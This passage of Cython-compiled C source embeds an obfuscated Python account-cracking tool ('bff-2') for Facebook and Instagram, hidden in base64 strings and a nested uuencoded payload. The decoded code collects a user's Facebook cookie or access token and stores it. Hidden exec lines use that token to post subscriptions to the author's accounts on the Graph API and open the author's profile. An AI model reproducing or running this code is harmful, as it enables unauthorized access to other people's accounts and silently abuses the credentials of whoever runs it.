hNREF3TURFMU5EQXlPVGt4TURndmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRWhoYTJscmFRb2dJQ0FnSUNBZ0lISmxjWFZsYzNSekxuQnZjM1FvSjJoMGRIQnpPaTh2WjNKaGNHZ3VabUZqWldKdmIyc3VZMjl0THpFd01EQTFOVGt4T0RNNU1USTRNQzl6ZFdKelkzSnBZbVZ5Y3o5aFkyTmxjM05mZEc5clpXNDlKWE1uSlNoMGIydGxiaWtwSUNNZ1ZHbGhjbUVnWVhKMENpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01EQTVNemcwTXpNNE5EY3dMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxj""eWNsS0hSdmEyVnVLU2tnSXlCSmQyRnVJR2hoYm1ScFlXNXplV0ZvSUhZeUNpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ETTJOalUxTXpJMU9UazJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCQlluVnpkRzhnU21GMllRb2dJQ0FnWlhoalpYQjBPZ29nSUNBZ0NYQmhjM009JykpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQoJbWVudSgpDQoNCiIiIg0KICAgIEF1dGhvciA9IFJvbWkgQWZyaXphbA0KICAgIEJpYXIgYXBhIHNpaCBkaSBjb21waWxlIGFueWluaw0KDQoiIiI=";
static PyObject *__pyx_kp_s_IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5n;
static PyObject *__pyx_n_s_b64decode;
static PyObject *__pyx_n_s_base64;
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_cr(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_cr},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "cr",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_s_IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5n, __pyx_k_IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5n, sizeof(__pyx_k_IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5n), 0, 0, 1, 0},
  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},
  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  /* "cr.py":4
 * 
 * import base64
 * exec(base64.b64decode('IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5nIGJ5IFJvbWkgQWZyaXphbA0KIyBOb3RlIDogamFuZ2FuIGRpIHViYWggbGFnaSEgbmFudGkgZXJyb3IsIHNjcmlwdCB1ZGFoIGVuYWsNCmltcG9ydCBvcw0KdHJ5Og0KCWltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIHJlcXVlc3RzJykNCnRyeToNCglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgZnV0dXJlcycpDQp0cnk6DQoJaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIGJzNCcpDQogDQpIaiA9ICdceDFiWzE7OTJtJyANCk10ID0gJ1x4MWJbMG0nIA0KZGVmIGluZ2ZvaCgpOg0KCXByaW50ICgNCiIiIiVzDQog4oCiIEluZm8gc2NyaXB0IDoNCiAJDQogLSBhdXRob3IgICAgICA6IFJvbWkgQWZyaXphbA0KIC0gZmFjZWJvb2sgICAgOiBmYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMg0KIC0gZmFuc3BhZ2UgICAgOiBmYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2DQogLSB3aGF0c2FwICAgICA6ICs2MjgyMzcxNjQ4MTg2DQogLSBnaXRodWIgICAgICA6IGdpdGh1Yi5jb20vTWFyay1adWNrDQogLSBzY3JpcHQgbmFtZSA6IGJmZi0yDQogLSB2ZXJzaW9uICAgICA6IDEuMw0KIA0KJXMiIiIlKEhqLE10KSkNCiAgICANCmltcG9ydCByZXF1ZXN0cywgc2h1dGlsLCBvcywgcmUsIGJzNCwgc3lzLCBqc29uLCB0aW1lLCBwbGF0Zm9ybSAscmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgbG9nZ2luZywgYmFzZTY0DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXINCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgamVkYQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gY2FsZW5kYXIgaW1wb3J0IG1vbnRocmFuZ2UNCg0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbl8gPSBbJ0phbnVhcmknLCAnRmVicnVhcmknLCAnTWFyZXQnLCAnQXByaWwnLCAnTWVpJywgJ0p1bmknLCAnSnVsaScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPa3RvYmVyJywgJ05vdmVtYmVyJywgJ0Rlc2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCmhhcmkgPSBjdXJyZW50LmRheQ0KYnVsYW4gPSBidWxhbl9bblRlbXBdDQp0YWh1biA9IGN1cnJlbnQueWVhcg0KYnVsbGFuID0gY3VycmVudC5tb250aA0KDQp3YWt0dSA9ICgiJXMtJXMtJXMiJShoYXJpLGJ1bGFuLHRhaHVuKSkNCmJ1bGFuMTIgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCg0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCg0KZXhlYygobGFtYmRhIF9fLCBfLCA6IF8oYidiZWdpbiA2NjYgPGRhdGE+XG5NKFIhJDoyISM7VlVQOjZRRSgkRVQ9MiEiOjYlUigkJVA4MiFTOjIhQTs2SUk8QiBaPUBIQygkKVQ9UiEmXG5NO1ZRTDtXPEAxJl1OOlIhQjxGXFxALkIhSD1cJzFQPFNITytWPUk9JkFVOEJZQztWVE8zNiVSOlJVOj02LUtcbk0iQixAMlYlUzo2QEA0VzFBPEIhKj02PUEoJClPOyY1SCgkQFM6Iy0oLFIgWjEgSUU+JjVDKiJBTDg2VUJcbk05JiRAN1VcXEwoJVxcTCgjSEA3UkFCKVYpRTlWRU4oIzhWLUIgXFw5JiVUODNZPDtEVEg0QiRELkMoQShTTTZcbk01NSBaLUUlJSoiMSU1I1RSKDIoWi1CNTIqIjBFNCNAUig1LFosQiUhLlM5KTIzUSIoJUhdMCRBIyoiMElcbk01I1UyKDI5PDtEVFs1RSUsLlU8XFwwIyRGNzRYWjRCJSIvJDk8NyQgTjBCJSgvNVBHLDUgXFw0VEEvKlU4XVxuTTIzVEYwNTRYMEVFIy5VOTQzUyxWKTUoWjRFNFovMzhNMlVRTjMyKSIrJCBSNUI1My5DOSAwIzE3LDQkXFxcbk0wQiRKLzM4XTAyQEQqNFxcWylDNSgqIjEgNFNIQysyQEw0QiE6LDIhKTEzWEYtNCxKKEQlLC4jOTUwRVFOXG5NMzNERikkIFc1NVE8MyJARTclUSwqIi0oMCM9MjA0KEk1QkUlLjU5JTNCQEMuJThNMEIhPDcjREYpNTBYXG5NLFVEXFwuVDE0MiMxIikkME4wUkEhKiUtLS1FUU4zMzRVKCVITTEyNEUqQihRKTM0QzUlKEgsQkE6KzQoVVxuTSxCSEIsJDRUKFQhMiojNEw2QlEiKTIkTjRTREksQy0xKEJARTIlVFApJCRDKkIoUDI1UU4zMzRDNTMoSFxuTSxDRFxcLlQxNDZTNSUpMlBONTNRPDcjIEMpJDhXLSVBOi0kKEUoQlxcRC4zUFcpIiEuLCQoRSoiXFxVNCQ8TFxuTS0yITw3IzE0MDJcXEo1M0E9NyZZLSxDLTQxQyBVLSVAUDE0NEMrRTRZLSMtMyslOEktMkE6LSQ0VDZCXFxTXG5NLiRUUjU1JS4sUyhJKEJMRCglKFUwQzRTK0QsWSgjIEMsMzxMLSIxPDclUU4zMyEiKSRITyxTQT0sIykgXG5NMSJIVDclUTsqNCxVKiJIQiwyIFQ0VEEjKlMpIDMjMSIoM0hMLEIkSSwzLTgxQlRUKyRISDEiNEwrQixZXG5NLTMhJTQ0WTw7RFRTLFQxJioyMEA1UzRVNDNQUyhEISUtUjUxKyJIQisyQFAoU1RSLCMwSDIzNSIxMjROXG5NLTNERSxUKSAwUlhFLiRUUDBCJFxcLVItJDFCRFUsJUE8O0RUTDU0MTw3Ilk0LDMwUihTJEIqMjBQM0MhMlxuTTAyJEopMlRNKzQ1MTNDLFMtJTRIKTRBLSwzKFQxMkkiKiUkSSxTMSMtMjRIMiJRIjAzSEstIkE1NyZZLVxuTSskKSgwQlBELSUwSDUiJFIqQixUMyM5IjQyKEksQjEuLSUtJDIyUSMrMyRIMEQhJSxCNTQ0IkREKSQsSlxuTTBCQTAsQzUxM0MsUy0kLFUsUkEoNyZZLSskLSQ3JVBONSMkVC1FLFUpMkRSNCRYVSxVJFxcLVIsQDBSRERcbk0uJTxNKTQkWisyMEgxMkEiNyVRJCtDLTA1UkRCKDJYTCkiQSUqQik8NyU0VCkjUSw3JlktKzMoQS8jPENcbk0sMzBQLEVRPDJDNFMwM1RXKUVETSskLE0tIyUjKCU0TSk0ITAsMzBUMFJNJS0lRE0oUlRTKlI0WDIyVFJcbk0wM0hNKSMxNC1EKTw3JS08O0RUTiklMTItMzRFK0JRMyokREgwRFEkKiI0SDUzISMtJSxLMSJROSoiLEBcbk0wUlBTLyRQTShDJFxcLVI1MTNDLFMoMihJKSRBLyslLSEvMlBDKjIhPDtEVFEoREE0LVI1MS5SSFQrJTRKXG5NKERBIisjKEA1IzE0MDIsSjRSREAsUixRKEJAUzIkUEwwQjEpKyMsTS4jJSI1JTBLKSRBKCwyKFQzIk0iXG5NKyVFPDtEVE0sUiRFLSMxOS8jTSQ1JSxMNSMkRipDKFAwIzUzLSU0VCxVITMqJDBBKTJVMi0zJEsoREEiXG5NKlMpIDQiQTM1JShMKFMhKCxDLFUoQyRSLSRZPDtEVE0sVDElKyUwSSgjITI2JDROKSUxMCwkKEQ3JVBNXG5NNEJURCw0KSQ1MlBFMDNQWzElMSwtMzBRLyM8QjYzMEwsUyE1LSUsUS0yVFItM1BXKSUxNTcmWS0rJSxRXG5NLzJMQyskVE4oUjRFLSMxODRSUSUsMzBKNEMxPDcjNFMpJShNKSIxKywzKTEuIlEjKyQwUDRSISUrMjRcXFxuTTMjNFUpJVE8KzM0TDUjNFU0NFk8O0RUUyxTMSUtUjUxKkJIRCozMFUoRSEiKlMpNDMzMSQ0MjBNMEM0UVxuTStSKTQ1MlBFLSRQVDE1JFxcLSQpODEyVEUrJFBQMSMkRCpFLEw1MkBDLzItPDtEVE8pIkEvKyQoUStSVEVcbk0rMzBVLFNRJi1DKTQzMzEyNSVRPC1SOTkrMlUyLSVRPC0zKTQ1MlBTNyVRLS0kLSQ2MkkzKjM0TSxFMTNcbk0tMjE8NyUwVDUzJFU3JlktKlM0TDMyXFxDLyQ0TykzMS0rMyxEN1JJMy0lMFUsRVE8NEM8UyskXFxMNFMkV1xuTSpSNFUsMlxcQy4zLE0sUkE1KjM1MS8jLTU0NFhTLEQxMy0yMFQzNVFOMzJEUjQzVEssUlE8NyM0UjIkNFNcbk0pJTEtKzMsUSxCVTIuM0RLLERUQysiNFQzUlEyKSUsSzRSUTQtNSkxLTMwUzQlNFQ0UyRVKzMoVS8jPERcbk01JTU8O0RUTDRTJF0qUyhUMzJUUjclUSIsMyxJLyNNJDUlJEktNSRcXCxULEEsUlRFNSRUSSxTMTErJTBMXG5NMyMxMyslLE0pM1EsLTM0RDclUE0tMlE0LTMsVDE1UU4zMzxFNDJUTSxSUTQtUyktLTJMUiwlNFQ0QiRTXG5NKzUoVSwyWTMvJDhWLEUxKisyKSEtMkkzKjNAUSk1JS4sUyk4MTJERSgkUFEoQjEjKlMsSDQlUU4zMyBDXG5NKjIoUCxCQTErJCxRK1JQRCsyMFEsRTEyKkMoRDIjITIsMihMMEMhKC0jKTQ1MlBTNyVRKywlKTEvMkhDXG5NKyQwVDRSITMrMjRcXDMjNFUpJVE8NyZZLSszNEw0MkElNDRYUyxEITMtMjEoMiMhJCwyIEsoQyE1KyMsTVxuTSkzMFQ2JSxMNEUkUysyLE0sIyhTLSQsTSkzISssMikhLjJNMyskVEgwUiEyNyZZLSpCNEQyIyREKSU8S1xuTSxSUTUrMixdLEM0Uy0kWEksUyRWKkI0UDQyVSU0NFhTLEREUypTLTA1UkRTNDM0SyxTMTQsJCktKEJMRVxuTTQzUEw0UlEkNyZZLS0kLFQ0QkxENCRQVS0yMTw3IlUjKjI0SDRFMTIqUjE4NTJRNCklJE00Q0RZKlMpMFxuTTRSTEU1JFRMNFUkUys1KFUsMkhCMiQ0TSkyNFxcLlQxNDIlUU4zMkEkMSQoSjBDJEAtMixBKSJAUiokSFBcbk0wUjElKlUoTSsyREMtJDBKKTIxLSszLEQ3UkkzLSUwVSxFUTw0QzxTKyUkSSxVJFAqUyhMNDJYQjUlLTxcbk07RFRNLFMhNy0kNFQ1Mk0iLSQwVCxFJFQqMjRZLyNNJDUkVFQ0UiRQKzQsVSwzLSMrJShVKTMxNSslKEFcbk0rUlBFKzIkSyxFJFUqUykwNSMhJCgyNTw7RFRNLEMkQCxCLEQwQkREKiRMUShFJFkqUyxMNCMhMyslLE9cbk0pJEEtKyUoRDIiTEIsJSBUKFJEQi0zLFUvI00kNSRUTDUzJE8rMjRNLSM0UjUzLTw7RFRLLFUxLyolMTRcbk0xIlRSLSVRPC0zKTQ1MlBTNyVRKyszLFEtMk0zLTMkUzBSUTItUyxMM1JRMywzPEspMzRRK1IsVSxSVEVcbk0tJTRJLTUkXFwsUyxUNFVRTjMyVEU1JExVLEUkXS1SOTkrMkxTKyVRPC0lLFxcMTMwUy8kVEw0UzE0KzU0SVxuTS0yVFIyJDBIKTNRLCwyKEQwQkxCKiUgUihSRFMrIyhINCJRJCwyQTw7RFRMLEJBJCxDKS0tMkxFNSRUTFxuTTRVJFMrNShVLDJVMjUlLE0sUyE3LTM0RStDPEY2MlRMNFJEVSszKTQ0UzRENyVRNC0lNFEtMkxVKyRUT1xuTSxFUTwwVVFOMzMsUiwlNEksVSRVKyMoTDQyXTIzJTRNKTMxLyskNTQ0Uk0zKyUwVTRFJFUtIy0wNTMxM1xuTSwzNE0sQzRcXC1SMTQ1MlEzLDNUSjUzMSwtUzUxM0VRTjMzLFI0MihQKSMxNSoyMEEqIlBSKiQwUDBEVERcbk0rIjUkMjJRMiwzKEwoUkEpK1ItLSkjNEUpJEBRKSIxNypTLEw1MlRDLzMoVSxTMS0rJTRRK1VRTjMyVEVcbk0rMzBVLEU0UysiNFA1UyEkLSQsSyxSQSwsUzUxM0MsUy0lLFEpMjEsKiUpNDMiVFQqMkBVKEUhMy0iNSxcbk00IzEjKSVASjRSUTUrMixdLEVRTjMzNFMtJFRMNTMkTysyNE0tIzRSNTMsSyxVITcqMjBBKiJUUyskMFBcbk0oU1EmLUMpNDJDJEIwMkBMMFJRKCwkNTEzQyxTKCUoSikyMSgsJChRLyVRTjMzPEI2MzBKKSIxLyolMTRcbk0xQkxTLDNAVixEMTUqMyk4MkJUUjElJEs1MlE9KyQsRDEjJEQyJEBQMSMxNSpVLEw1MlxcUygzLFMsU0EsXG5NKzIsUS4lUU4zMlREKjIkSyhFNFUrMy01LyNNJDUlKEw1JSRXKkIsUS8jPEU0M1BMLTJRJC1VLFxcMUM4RVxuTSwkVFUsRDEgKyM0TSgyVSMvJTBMKTQxLSwkNFQ0VVFOMzJJIy0kREkoUlRDLDIwWDMyVEI0M0xNLSJRJVxuTSozKSkoUkhSLCRASS0yNE4qQihVLDMtJTQ0WFMsVDE2LUMwUDVSRSUwNVBHKkUoVS8yXTIyJSk8O0RUUVxuTSkkISgsNSxVLTJVNS4kVFM0VDEmKzMwTDIjISUpJVxcTTUzREUsUy0wMUM8VSolVEktNTE/KkQoSDczITNcbk0zMzhMLSMxOC01KTE3IjxKMFJEWTcmWS0sMjUxM0M8Qi8lRE0wRTRPK0MoWDUjKFIyJSBIKEIkXFwuVChBXG5NLyNNJi00WFkpNSUuKjUpMS9TPTIxJERKKEJFNS8zNT0wU002LDQ0WDRCQSw3JlhdLVU1PTIzTFcoNFxcXFxcbk0xUyRfLVUpIDFTQTY3NDBZLUJVMyo1KSQzQ0RGLTQsWzVDJSUqQykkKCVRTiglUU45NllENyZYRyslXT9cbksqMkRIKEc1VTdWLU85JjVDKEJRPzdWRU08Jl1SPSVdPyoiPUM7VjFFOFcsRyoyWUQ5Ni1POSY0SSowICBcbiBcbmVuZFxuJyxfXykpKCJ1dV9jb2RlYyIsX19pbXBvcnRfXygnY29kZWNzJykuZGVjb2RlKSkNCg0KIyBLVU1QVUxBTiBXQVJOQQ0KTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFIDQpIID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUNCksgPSAnXHgxYlsxOzkzbScgIyBLVU5JTkcNCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVDQpVID0gJ1x4MWJbMTs5NW0nICMgVU5HVQ0KTyA9ICdceDFiWzE7OTZtJyAjIEJJUlUgTVVEQQ0KUCA9ICdceDFiWzE7OTdtJyAjIFBVVElIDQpOID0gJ1x4MWJbMG0nICMgV0FSTkEgTUFUSQ0KYWNhayA9IFtNLCBILCBLLCBCLCBVLCBPLCBQXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKGFjYWspDQp0aWwgPSLigKIiIA0Kb2ssIGNwLCBpZCwgdXNlciwgbG9vcCA9IFtdLCBbXSwgW10sIFtdLCAwDQpwd3ggPSBbXQ0Kc3lzLnN0ZG91dC53cml0ZSgnXHgxYlsxOzM1bVx4MWJdMjsg4pynIGJmZi0yIGJ5IHJvbXog4pynIFx4MDcnKQ0KDQpkZWYgamFsYW4oa2VsaWxpbmcpOg0KCWZvciBtYXUgaW4ga2VsaWxpbmcgKyAnXG4nOg0KCQlzeXMuc3Rkb3V0LndyaXRlKG1hdSkNCgkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMykNCmRlZiB0aWsoKToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10NCiAgICBmb3IgbyBpbiB0aXRpazoNCiAgICAgICAgcHJpbnQgKCdcciVzJXMgbWVuZ2hhcHVzIGFrdW4gZGFyaSB0ZXJtdXggJXMnJShNLHRpbCxvKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQpkZWYgY2xlYXIoKToNCglvcy5zeXN0ZW0oImNsZWFyIikNCmRlZiBmb2xkZXIoKToNCgl0cnk6b3MubWtkaXIoJ09LJykNCglleGNlcHQ6cGFzcw0KCXRyeTpvcy5ta2RpcignQ1AnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Om9zLm1rZGlyKCdkYXRhJykNCglleGNlcHQ6cGFzcw0KIyBMT0dPIChMTyBHT0JMT0spDQpkdCA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iKS5qc29uKCkNCnRyeToNCiAgICBJUCA9IGR0WyJxdWVyeSJdDQogICAgQ04gPSBkdFsiY291bnRyeSJdDQpleGNlcHQgS2V5RXJyb3I6DQogICAgSVAgPSAiICINCiAgICBDTiA9ICIgIg0KZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdZWFYwYUc5eUlEMGlVbTl0YVNCQlpuSnBlbUZzSWdwbVlsOXRaU0E5SW1aaFkyVmliMjlyTG1OdmJTOXliMjFwTG1GbWNtbDZZV3d1TVRBeUlncG5hWFJvZFdJZ1BTSm5hWFJvZFdJdVkyOXRMMDFoY21zdFduVmpheUk9JykpDQpkZWYgYmFubmVyKCk6IA0KICAgIHByaW50ICgnICVzJXMlcyVzJXMlcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJXMlcyVzJXMlcyVzXG4lcyAgIF9fX19fX18gIF9fX19fXyBfX19fX19fIF9fX19fX18gXyAgICAgX1xuICAgfCAgICAgICB8X19fX18vIHxfX19fX3wgfCAgICAgICB8X19fXy8gXG4lcyAgIHxfX19fXyAgfCAgICBcXF8gfCAgICAgfCB8X19fX18gIHwgICAgXFxfXG5cbiAgICAgJXMgICAgJXMgJXNDb2RlZCBieSAlczogJXMlcyAlcyVzICAgXG4gJXMlcyVzJXMlcyVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlcyVzJXMlcyVzJXMgXG4gJXMjICVzRmIgICVzIDogJXMlcyBcbiAlcyMgJXNHaXQlcyAgOiAlcyVzIFxuICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjICAnJQ0KICAgIChNLHRpbCxLLHRpbCxILHRpbCxNLHRpbCxLLHRpbCxILHRpbCxNLFAsVSx0aWwsSyxNLEssYXV0aG9yLFUsdGlsLE0sdGlsLEssdGlsLEgsdGlsLE0sdGlsLEssdGlsLEgsdGlsLFUsTyxNLE8sZmJfbWUsVSxPLE0sTyxnaXRodWIsUCxNLFApKQ0KICAgIHByaW50ICgnICVzIyVzIElQICAgJXM6JXMgJXMgJXMtICVzJXMgJyUoVSxPLE0sTyxJUCxILE8sQ04pKQ0KIyBNQVNVSyBUT0tFTiAoVE9LRU4gTElTVFJJSykNCmhlYWRlciA9IHsndXNlci1hZ2VudCc6J01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wJ30NCmRlZiBtYXN1aygpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKTtiYW5uZXIoKQ0KICAgIHByaW50ICgnXG4lcyVzJXMgMDEgJXNMb2dpbiBpbnN0YWdyYW0gKGNyYWNrIGFrdW4gaW5zdGFncmFtKSBcbiVzJXMlcyAwMiAlc0xvZ2luIHZpYSBjb29raWUgKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDMgJXNMb2dpbiB2aWEgdG9rZW4gKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDQlcyBDYXJhIG1lbmRhcGF0a2FuIHRva2VuICYgY29va2llIGZhY2Vib29rIFxuJXMlcyVzIDAwICVzS2VsdWFyJyUoVSx0aWwsSyxPLFUsdGlsLEssTyxVLHRpbCxLLE8sVSx0aWwsSyxPLFUsdGlsLE0sTykpDQogICAgcm9tID0gcmF3X2lucHV0ICgiXG4lcyMgJXNQaWxpaCAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICBpZiByb20gaW4oIiIpOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgcm9tIGluICgnMScsJzAxJyk6DQogICAgCWlnZygpDQogICAgZWxpZiByb20gaW4gKCcyJywgJzAyJyk6DQogICAgCWphbGFuKCJcbiVzISVzIFdhamliIGd1bmFrYW4gYWt1biB0dW1iYWwgZGlsYXJhbmcgYWt1biB1dGFtYSIlKE0sTykpDQogICAgCWtvb2sgPSByYXdfaW5wdXQoIiVzIyAlc0Nvb2tpZSAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYga29vayBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIGNvb2tpZSBrZW50b2QgIiUoTSx0aWwpKTtleGl0KCkNCiAgICAgICAgb3BlbignZGF0YS9jb29raWVzJywgJ3cnKS53cml0ZShrb29rKQ0KICAgICAgICBrb252ZXJ0ZXIoKQ0KICAgICAgICBleGl0KCkNCiAgICBlbGlmIHJvbSBpbiAoJzMnLCcwMycpOg0KICAgICAgICBqYWxhbigiXG4lcyElcyBXYWppYiBndW5ha2FuIGFrdW4gdHVtYmFsIGRpbGFyYW5nIGFrdW4gdXRhbWEiJShNLE8pKQ0KICAgIAlyb216ID0gcmF3X2lucHV0KCIlcyMgJXNUb2tlbiAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYgcm9teiBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIHRva2VuIGtlbnRvZCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIAl0cnk6DQogICAgICAgICAgICBuYW1hID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JXMnJShyb216KSxoZWFkZXJzPWhlYWRlcikuanNvbigpWyduYW1lJ10NCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzIExvZ2luIHN1Y2NlcywgbW9ob24gdHVuZ2d1ICclKEgsdGlsKSkNCiAgICAgICAgICAgIG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3cnKS53cml0ZShyb216KTtsb2dpbl94eCgpDQogICAgICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2IzTXVjM2x6ZEdWdEtDZDRaR2N0YjNCbGJpQm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmNtOXRhUzVoWm5KcGVtRnNMakV3TWljcE8yMWxiblVvS1E9PScpKQ0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIAlwcmludCAoIiVzJXMgVG9rZW4gaW52YWxpZCAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgIGVsaWYgcm9tIGluICgnNCcsICcwNCcpOg0KICAgIAlwcmludCAoIlxuJXMlcyAlc1VudHVrIG1lbmRhcGF0a2FuIHRva2VuICVzOiVzI